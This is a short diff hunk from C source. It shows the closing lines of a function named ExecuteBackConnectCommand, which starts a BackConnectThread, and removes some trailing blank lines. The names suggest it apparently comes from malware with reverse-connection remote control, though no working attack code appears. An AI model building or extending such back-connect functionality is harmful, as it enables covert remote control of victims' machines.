@@ -859,7 +859,3 @@ bool ExecuteBackConnectCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments)
 
 	return StartThread(BackConnectThread, H) != NULL;
 }
-
-
-
-
